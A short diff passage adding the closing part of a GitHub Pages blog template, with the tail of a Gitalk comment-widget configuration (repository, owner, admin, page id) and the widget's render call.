+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
